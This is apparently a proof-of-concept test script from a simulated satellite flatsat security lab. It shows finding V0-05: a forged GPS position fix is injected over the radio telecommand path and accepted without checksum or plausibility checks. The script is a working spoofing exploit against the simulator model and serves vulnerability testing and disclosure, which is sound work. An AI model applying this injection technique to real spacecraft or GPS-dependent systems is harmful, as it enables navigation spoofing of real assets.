#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


import struct
def main(dev, ev):
    # V0-05: the GPS chain trusts position with no checksum verification and
    # no plausibility gate. The v2 model injects exactly what a UART/RF
    # spoof delivers; note the device accepts an absurd jump (5000 km) and
    # never questions it.
    tms = dev.tc(0x0E, b"", via="usb")
    nav0 = dev.find(tms, 0x0E)[0]
    ev.log(f"before: lat_e7={nav0.le32(3)} lon_e7={nav0.le32(7)}")
    # forge a fix: Tokyo (35.68, 139.69), bogus satellite count, no checksum
    pay = struct.pack("<iiiB", 356800000, 1396900000, 40000000 // 100, 3)
    tms = dev.tc(0x14, pay, via="radio")
    check(not dev.errors(tms), f"spoofed fix must be accepted, got {dev.errors(tms)}")
    tms = dev.tc(0x0E, b"", via="usb")
    nav = dev.find(tms, 0x0E)[0]
    ev.log(f"after forged sentence: lat_e7={nav.le32(3)} sats={nav.u8(2)}")
    check(nav.le32(3) == 356800000, "forged latitude must be trusted verbatim")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V0-05 GPS accepted with no checksum / plausibility", main))
